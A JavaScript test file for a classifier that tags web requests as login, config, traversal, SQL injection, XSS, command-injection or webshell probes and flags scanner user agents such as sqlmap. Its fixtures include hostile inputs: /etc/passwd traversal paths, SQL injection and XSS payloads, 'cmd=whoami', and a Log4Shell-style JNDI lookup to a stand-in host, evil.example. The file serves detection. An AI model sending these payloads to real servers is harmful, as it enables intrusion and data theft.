import test from "node:test";
import assert from "node:assert/strict";
import { classifyRequest, isLikelyBot } from "./classification.js";

const row = (path, userAgent) => ({ path, userAgent: userAgent || "" });

for (const [path, expectLabel] of [
  ["/wp-login.php", "login probe"],
  ["/wp-admin/", "login probe"],
  ["/phpmyadmin/", "login probe"],
  ["/server-status", "login probe"],
  ["/.env", "config probe"],
  ["/.git/config", "config probe"],
  ["/wp-config.php.bak", "config probe"],
  ["/backup.sql", "config probe"],
  ["/../../etc/passwd", "path traversal"],
  ["/%2e%2e/%2e%2e/etc/passwd", "path traversal"],
  ["/products?id=1'+OR+'1'='1", "SQLi probe"],
  ["/products?q=1%20union%20select%20username", "SQLi probe"],
  ["/search?sleep(5)", "SQLi probe"],
  ["/?q=<script>alert(1)</script>", "XSS probe"],
  ["/?q=%3Cscript%3E", "XSS probe"],
  ["/?redirect=javascript:alert(1)", "XSS probe"],
  ["/?cmd=whoami", "command injection"],
  ["/?x=${jndi:ldap://evil.example/a}", "command injection"],
  ["/wp-content/uploads/shell.php", "webshell"],
  ["/c99.php", "webshell"],
  ["/products/hydro-flask-32oz", null],
  ["/api/v2/cart", null],
  ["/assets/app.4f2b.js", null],
]) {
  test(`classifies ${path}`, () => {
    const tags = classifyRequest(row(path));
    if (expectLabel === null) {
      assert.equal(tags.length, 0, `expected ordinary, got ${JSON.stringify(tags)}`);
    } else {
      assert.ok(tags.some((t) => t.label === expectLabel), `expected "${expectLabel}", got ${JSON.stringify(tags.map((t) => t.label))}`);
    }
  });
}

test("sorts exploit-shaped tags ahead of probing tags", () => {
  const tags = classifyRequest(row("/../../.env?q=<script>alert(1)</script>"));
  const ids = tags.map((t) => t.id);
  assert.deepEqual(ids, ["path-traversal", "xss-probe", "config-probe"]);
});

test("scanner user agents classify and count as bots", () => {
  const tags = classifyRequest(row("/", "sqlmap/1.7.2#stable"));
  assert.ok(tags.some((t) => t.label === "scanner"));
  assert.ok(isLikelyBot("sqlmap/1.7.2#stable"));
  assert.ok(isLikelyBot("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"));
  assert.ok(isLikelyBot("masscan/1.3 (https://github.com/robertdavidgraham/masscan)"));
  assert.ok(!isLikelyBot("Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/140.0"));
});

test("normal traffic stays untagged", () => {
  assert.deepEqual(classifyRequest(row("/", "Mozilla/5.0 (Windows NT 10.0)")), []);
  assert.deepEqual(classifyRequest(row("/products?page=3&sort=price")), []);
  assert.deepEqual(classifyRequest(row("/checkout/confirm?cart=8f21a")), []);
});